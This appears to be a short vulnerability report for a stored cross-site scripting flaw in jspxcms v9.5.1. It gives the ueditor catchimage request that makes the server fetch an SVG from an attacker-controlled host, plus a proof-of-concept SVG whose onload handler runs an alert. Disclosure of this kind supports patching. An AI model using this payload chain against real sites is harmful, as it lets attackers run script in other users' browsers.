Hi i found an cross-site Scripting (XSS) - Stored in jspxcms v9.5.1

What is XSS?

cross-site Scripting (XSS) payload = url + '/cmscp/core/ueditor.do?action=catchimage&source[]=' + 'http://{vps}/{exp-xss.svg}'

First,obtain backend permissions   url = url + '/cmscp/index.do'

![image](https://github.com/Yao-ruo/FIND/assets/94469929/8b6e254b-b4fa-42f2-b422-743dc67365bc)

then we can go to  '/cmscp/core/ueditor.do?action=catchimage'

![image](https://github.com/Yao-ruo/FIND/assets/94469929/74ad3a55-3f28-41ac-8cd7-b1e143b4794a)

Let's create a POC ,name is test.svg

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('test-xss')"/>
```

![image](https://github.com/Yao-ruo/FIND/assets/94469929/d88a426c-087e-4095-8bc5-5ece831ebba9)

Now, poyload = url + '/cmscp/core/ueditor.do?action=catchimage&source[]=http://{vps}/test.svg'

![image](https://github.com/Yao-ruo/FIND/assets/94469929/c90aa009-d4b6-4a3e-8d5f-ba69e4e7f69a)

We will get `/uploads/1/image/public/202308/20230823010213_ad8vxb2h7l.svg`

Then access this directory

![image](https://github.com/Yao-ruo/FIND/assets/94469929/dd249689-0352-478f-a976-ba7325fcd4d7)
